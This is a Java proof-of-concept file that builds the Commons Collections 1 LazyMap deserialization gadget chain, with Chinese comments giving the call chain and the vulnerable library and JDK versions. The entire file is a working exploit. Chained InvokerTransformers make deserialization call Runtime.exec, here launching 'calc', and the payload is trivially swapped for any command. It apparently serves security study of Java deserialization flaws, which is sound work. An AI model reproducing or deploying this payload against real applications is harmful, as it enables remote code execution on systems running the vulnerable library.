
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Decoder;


import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static util.Util.serialize;
import static util.Util.unserialize;

public class Commoncollections1_LazyMap {
/* 调用链展示：
AnnotationInvocationHandler.readObject()
   Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InvokerTransformer.transform()
*/
/*版本依赖:
commons-collections : 3.1
TransformedMap - jdk < 8u71
 */


    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer chainedTransformer=new ChainedTransformer(transformers);
        Map hashMap=new HashMap();
        LazyMap lazyMap=(LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler map_handler=(InvocationHandler) constructor.newInstance(Target.class,lazyMap);
        Map proxy_map=(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);

        //反射调用AnnotationInvocationHandler
        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler=(InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Target.class,proxy_map);

        serialize(handler);
        unserialize();
    }
}